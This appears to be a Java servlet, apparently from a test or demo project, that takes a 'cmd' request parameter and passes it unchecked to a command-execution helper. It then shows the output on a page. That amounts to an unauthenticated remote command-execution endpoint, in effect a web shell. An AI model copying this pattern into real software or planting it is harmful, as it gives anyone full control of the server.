package api.services;

import api.utils.CommandUtils;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = {"/test-servlet"})
public class TestServlet extends HttpServlet{
   @Override
   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
      String cmd = req.getParameter("cmd");
      String result = CommandUtils.Execute(cmd);
      req.setAttribute("execResult", result);
      req.setAttribute("cmd", cmd);

      getServletContext().getRequestDispatcher("/index.jsp").forward(req, resp);
   }
}
